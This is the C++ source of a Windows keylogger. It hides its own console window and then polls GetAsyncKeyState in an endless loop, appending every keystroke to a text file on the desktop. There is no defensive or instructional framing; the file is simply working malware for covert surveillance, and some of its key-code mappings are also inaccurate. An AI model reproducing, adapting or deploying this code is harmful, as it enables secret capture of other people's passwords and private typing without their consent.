#include <iostream>
#include<windows.h>
#include<Winuser.h>
#include<fstream>

using namespace std;


void hide()
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth , 0);
}

void log()
{
     char c;
    for(;;)
    {
       // Sleep(0);
      for(c = 8; c<=222;c++ )
      {
          if(GetAsyncKeyState(c)== -32767 )
          {
              ofstream write ("C:\\Users\\HEMPAREKH\\Desktop\\record.txt",ios::app);
//
//              switch(c)
//              {
//                  case 8: write << "<BackSpace>";
//                  case 27: write << "<ESC>";
//                  case 127: write<< "<DEL>";
//                  case 32 : write<<" ";
//                  case 13 : write<< "<Enter>\n";
//                  default: write<<c;
//
//
//              }
            if(((c>64)&&(c<91))&& !(GetAsyncKeyState(0x10)))//if shift key is not pressed
            {
                c+=32;
                write<<c;
                write.close();
                break;
            }
            else if((c>64) && (c<91))
            {
               write<<c;
               write.close();
               break;
            }
            else
            {
                switch(c)
                {

                case 33:
                    {
                        if(GetAsyncKeyState(0x10))
                            write<<"!";
                        else
                        write<<"1";


                    }
                    break;
                case 34:
                    {
                        if(GetAsyncKeyState(0x10))
                            write<<"*";
                        else
                            write<<"8";
                    }
                    break;
                case 35:
                    {
                        if(GetAsyncKeyState(0x10))
                            write<<"#";
                        else
                            write<<"3";
                    }
                    break;
                case 36:
                    {
                        if(GetAsyncKeyState(0x10))
                            write<<"$";
                        else
                            write<<"4";
                    }
                    break;
                case 37:
                    {
                        if(GetAsyncKeyState(0x10))
                            write<<"%";
                        else
                            write<<"5";
                    }
                    break;
                case 38:
                    {
                        if(GetAsyncKeyState(0x10))
                            write<<"&";
                        else
                            write<<"7";
                    }
                    break;
                case 40:
                    {
                        if(GetAsyncKeyState(0x10))
                            write<<"(";
                        else
                            write<<"9";
                    }
                break;
                case 41:
                    {
                        if(GetAsyncKeyState(0x10))
                            write<<")";
                        else
                            write<<"0";
                    }
                    break;
                case VK_SPACE:
                    write<<" ";
                  break;
                case VK_RETURN:
                    write<<"\n";
                    break;
                case VK_TAB:
                    write<<"\t";
                    break;
                case VK_BACK:
                    write<<"<BackSpace>";
                    break;
                case VK_ESCAPE:
                    write<<"<ESC>";
                    break;
                case VK_DELETE:
                    write<<"<DEL>";
                    break;
                }
            }
          }
      }
    }
}

int main()
{
    hide();
    log();
    return 0;
}
